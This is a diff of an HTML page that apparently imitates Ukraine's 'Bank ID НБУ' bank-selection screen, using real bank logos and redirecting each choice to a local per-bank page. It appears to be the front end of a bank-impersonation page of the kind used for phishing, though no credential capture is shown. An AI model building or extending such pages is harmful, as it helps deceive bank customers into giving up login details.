@@ -638,17 +638,12 @@
     </style>
 </head>
 <body>
-    <!-- Новый компактный экран выбора банка -->
+    <!-- Новый компактный выбор банка -->
 <div id="bank-selection-screen" class="select-container">
-  <h1>Bank ID НБУ</h1>
-
-  <label for="bankSelect" class="select-label">Оберіть банк, в якому ви маєте рахунок</label>
-  <div id="bankSelect" class="select-box">Оберіть банк, в якому ви маєте рахунок...</div>
+  <div id="bankSelect" class="select-box">Оберіть банк...</div>
 
   <!-- Выпадающий список -->
   <div id="dropdown" class="dropdown">
-    <div class="dropdown-header">Оберіть банк, в якому ви маєте рахунок...</div>
-
     <div class="bank-item" data-bank="oschadbank">
       <img src="https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg" alt="Ощадбанк">
       <span>Ощадбанк</span>
@@ -689,8 +684,91 @@
       <span>Приват24</span>
     </div>
   </div>
+</div>
 
-  <button class="continue-btn">Продовжити</button>
+<style>
+  .select-container {
+    position: relative;
+    max-width: 320px;
+    margin: 120px auto;
+    font-family: "Segoe UI", Arial, sans-serif;
+  }
+
+  .select-box {
+    border: 1.5px solid #111;
+    border-radius: 8px;
+    padding: 10px 14px;
+    cursor: pointer;
+    font-size: 16px;
+    color: #333;
+    background: #fff;
+  }
+
+  .dropdown {
+    display: none;
+    position: absolute;
+    top: 110%;
+    left: 0;
+    width: 100%;
+    background: #fff;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    box-shadow: 0 6px 16px rgba(0,0,0,0.1);
+    max-height: 240px;
+    overflow-y: auto;
+    z-index: 200;
+  }
+
+  .bank-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 8px 12px;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+
+  .bank-item:hover {
+    background: #f2f7ff;
+  }
+
+  .bank-item img {
+    width: 28px;
+    height: 28px;
+    object-fit: contain;
+  }
+
+  .bank-item span {
+    font-size: 15px;
+    color: #111;
+  }
+</style>
+
+<script>
+  const selectBox = document.getElementById('bankSelect');
+  const dropdown = document.getElementById('dropdown');
+  const bankItems = dropdown.querySelectorAll('.bank-item');
+
+  selectBox.addEventListener('click', (e) => {
+    e.stopPropagation();
+    dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
+  });
+
+  document.addEventListener('click', () => {
+    dropdown.style.display = 'none';
+  });
+
+  bankItems.forEach(item => {
+    item.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const bank = item.dataset.bank;
+      selectBox.textContent = item.querySelector('span').textContent;
+      dropdown.style.display = 'none';
+      // переход на страницу
+      window.location.href = bank + '.html';
+    });
+  });
+</script>
 </div>
 
 <style>
